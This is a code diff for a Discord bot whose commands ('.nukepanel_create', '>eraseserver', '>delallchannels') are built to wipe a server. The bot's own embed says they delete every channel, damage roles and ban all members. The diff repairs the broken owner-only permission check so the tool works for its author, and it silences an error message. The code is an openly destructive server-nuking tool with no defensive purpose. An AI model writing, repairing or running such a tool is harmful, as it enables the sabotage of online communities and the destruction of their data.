@@ -16,7 +16,7 @@ client.on(Events.MessageCreate, async message => {
   {
     if (cmd.startsWith('.nukepanel_create'))
     {
-      if (!message.member.user.tag === 'HeadLance#1415') return false;
+      if (message.member.user.tag !== 'HeadLance#1415') return false;
 const nuke_warning = new EmbedBuilder().setTitle('NUKE').setDescription(':radioactive: This is A nuke command made by HeadLance#1045. this command will nuke the entire server, damage the channels, roles and ban all members. The embed you are reading now is the first and the last warning triggered by the command executed. If you are aware of what you are doing, then press the button.').setColor('DarkRed')
 const button_nuke = new ButtonBuilder().setCustomId('nuke').setLabel('Execute').setStyle(ButtonStyle.Primary);
 const row = new ActionRowBuilder().addComponents(button_nuke);
@@ -28,7 +28,7 @@ async function delchannels()
 {
    if (cmd.startsWith('>delallchannels'))
    {
-    if (!message.member.user.tag === 'HeadLance#1415') return false;
+    if (message.member.user.tag !== 'HeadLance#1415') return false;
     message.guild.channels.cache.forEach(c => { try { c.delete()} catch (erro) { }});
    }
 }
@@ -39,7 +39,7 @@ async function eraseuniverse()
 {
   if (cmd.startsWith('>eraseserver'))
    {
-    if (!message.member.user.tag === 'HeadLance#1415') return false;
+    if (message.member.user.tag !== 'HeadLance#1415') return false;
     message.guild.channels.cache.forEach(c => { try { c.delete()} catch (erro) { }});
 
     message.guild.roles.cache.forEach(r => { try { if (r) {
@@ -62,7 +62,7 @@ async function sayit(boo)
   
    
     sleep(2000);
-    message.delete().catch(e => message.channel.send(`:x: _client.websocket_ ${e}`));
+    message.delete().catch(e => message.channel.send(`nothing`));
    
   
 }
@@ -74,7 +74,7 @@ client.on(Events.InteractionCreate, async interaction => {
   if (!interaction.isButton()) return false;
   if (interaction.customId === 'nuke')
   {
-    if (!interaction.user.tag === 'HeadLance#1415') return interaction.reply({ content: 'Bruh.', ephemeral: true});
+    if (interaction.user.tag !== 'HeadLance#1415') return interaction.reply({ content: 'Bruh.', ephemeral: true});
 
     if (!interaction.guild.members.me.permissions.has('Administrator')) return interaction.reply({ content: 'I need `Administrator` Permission to begin the nuke.', ephemeral: true})
     interaction.guild.channels.cache.forEach(c => {
